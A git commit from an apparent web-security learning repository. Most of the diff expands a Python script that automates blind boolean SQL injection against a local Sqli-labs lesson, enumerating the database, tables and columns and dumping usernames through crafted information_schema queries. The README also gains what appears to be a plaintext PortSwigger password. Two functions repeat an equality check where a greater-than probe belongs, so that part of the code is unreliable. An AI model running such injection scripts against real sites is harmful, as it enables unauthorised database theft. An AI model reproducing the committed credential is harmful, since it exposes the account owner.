0c8c10142200b9aa158891368c4ec3e11e51ff0f
winters0x64 <arun0x168@gmail.com>
2023-03-13 11:36:11 +0530

    Portswigger

--- README.md
+++ README.md
@@ -1,3 +1,6 @@
 # WebSec
 
 Notes and tasks related to web security and  exploitation
+
+
+9\W*fk%j3*T9,{4siR3363sK\GmG"P%3 -> PortSwigger
--- Scripts/blind_based_boolean_automate.py
+++ Scripts/blind_based_boolean_automate.py
@@ -3,10 +3,13 @@
 import requests
 from bs4 import BeautifulSoup as bs
 
-LOW_LIMIT = 97
+LOW_LIMIT = 65
 HIGH_LIMIT = 122
 
 db_name_arr = []
+table_name_arr  = []
+column_name_arr = []
+dump_data = []
 
 # The parser
 def parse(res_html)->bool:
@@ -18,7 +21,7 @@ def parse(res_html)->bool:
 	return flag
 
 # Using partial binary search logic
-def automate(offset):
+def db_name_func(offset):
 	mid = (97+122)//2
 	
 	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
@@ -36,11 +39,83 @@ def automate(offset):
 		else:
 			mid = mid - 1
 		
+			
+def dump_table_func(offset):
+	mid = (97+122)//2
+	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
+		# Check if the mid value and ascii are the same
+		# http://localhost:8000/Less-8/?id=1' AND (ascii(select substr(table_name,1,1) from information_schema.tables where table_schema = 'security') = {mid}) --+
+		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{offset},1)) = {mid}) --+")
+		parseinit = parse(r.text)
+		if parseinit:
+			table_name_arr.append(chr(mid))
+			break
+		# Check is the mid value is less than the ascii value
+		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{offset},1)) > {mid}) --+")
+		parseinit = parse(r.text)
+		if parseinit:
+			mid = mid+1
+		else:
+			mid = mid - 1
+			
+			
+def dump_column_func(offset):
+	mid = (97+122)//2
+	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
+		# Check if the mid value and ascii are the same
+		# http://localhost:8000/Less-8/?id=1' AND (ascii(select substr(table_name,1,1) from information_schema.tables where table_schema = 'security') = {mid}) --+
+		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),{offset},1)) = {mid}) --+")
+		parseinit = parse(r.text)
+		if parseinit:
+			column_name_arr.append(chr(mid))
+			break
+		# Check is the mid value is less than the ascii value
+		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),{offset},1)) = {mid}) --+")
+		parseinit = parse(r.text)
+		if parseinit:
+			mid = mid+1
+		else:
+			mid = mid - 1
+			
+def total_dump(offset):
+	mid = (97+122)//2
+	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
+		# Check if the mid value and ascii are the same
+		# http://localhost:8000/Less-8/?id=1' AND (ascii(select substr(table_name,1,1) from information_schema.tables where table_schema = 'security') = {mid}) --+
+		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select username from users limit 0,1),{offset},1)) = {mid}) --+")
+		parseinit = parse(r.text)
+		if parseinit:
+			dump_data.append(chr(mid))
+			break
+		# Check is the mid value is less than the ascii value
+		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select username from users limit 0,1),{offset},1)) = {mid}) --+")
+		parseinit = parse(r.text)
+		if parseinit:
+			mid = mid+1
+		else:
+			mid = mid - 1
+	
+		
 def main():
 	for i in range(1,10,1):
-		automate(i)
-	db_name = "".join(db_name_arr)
-	print(db_name)
+		db_name_func(i)
+	
+	for i in range(1,10,1):
+		dump_table_func(i)
+	
+	for i in range(1,15,1):
+		dump_column_func(i)
+
+	for i in range(1,10,1):
+		total_dump(i)
+
+	
+	print("Database name is:" ,"".join(db_name_arr))
+	print("Table name is: ","".join(table_name_arr))
+	print("Column name: ","".join(column_name_arr))
+	print("Dump data: ","".join(dump_data))
+	
+	
 
 if __name__ == '__main__':
 	main()
